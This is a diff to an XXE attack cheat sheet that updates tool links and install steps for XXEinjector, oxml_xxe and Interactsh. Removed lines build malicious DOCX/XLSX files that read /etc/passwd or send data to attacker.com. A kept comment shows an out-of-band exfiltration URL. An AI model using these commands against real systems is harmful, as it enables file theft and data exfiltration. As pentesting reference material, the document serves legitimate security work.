@@ -1753,13 +1753,13 @@ RMI example:
 |Tool                       |Purpose                                 |Usage                                              |
 |---------------------------|----------------------------------------|---------------------------------------------------|
 |**XXEinjector**            |Automated XXE payload generation        |`./xxeinjector.py -u http://target.com -f file`    |
-|**oxml_xxe**               |XXE in Office documents (DOCX, XLSX)    |`python oxml_xxe.py generate -t xlsx`              |
+|**oxml_xxe**               |XXE in Office documents (DOCX, XLSX)    |`ruby server.rb`              |
 |**Burp Suite Collaborator**|OOB XXE detection and exfiltration      |Built-in to Burp Suite Pro                         |
 |**Interactsh**             |Free OOB interaction logging (DNS, HTTP)|`./interactsh-client`                              |
 |**PayloadsAllTheThings**   |XXE payload repository                  |https://github.com/swisskyrepo/PayloadsAllTheThings|
 |**CyberChef**              |Payload encoding/transformation         |https://cyberchef.io/                              |
 
-### XXEinjector
+### [XXEinjector](https://github.com/enjoiz/xxeinjector)
 
 ```bash
 git clone https://github.com/enjoiz/XXEinjector.git
@@ -1768,20 +1768,19 @@ cd XXEinjector
 ./xxeinjector.py -u http://target.com -t bing -p http://127.0.0.1:8080/admin
 ```
 
-### oxml_xxe
+### [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)
 
 ```bash
-pip install oxml_xxe
-python -m oxml_xxe generate -t xlsx -p "file:///etc/passwd" -o malicious.xlsx
-python -m oxml_xxe generate -t docx -p "http://attacker.com/?data=test" -o malicious.docx
+apt-get install -y make git libsqlite3-dev libxslt-dev libxml2-dev zlib1g-dev gcc ruby3.2 g++
+gem install bundler
+bundle install
+ruby server.rb
 ```
 
-### Interactsh
+### [Interactsh](https://github.com/projectdiscovery/interactsh)
 
 ```bash
-wget https://github.com/projectdiscovery/interactsh/releases/download/v1.0.0/interactsh-client_1.0.0_linux_amd64.zip
-unzip interactsh-client_1.0.0_linux_amd64.zip
-./interactsh-client
+go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
 # Use the generated domain in XXE payloads: http://<YOUR_INTERACTSH_DOMAIN>/?data=%file;
 ```
 
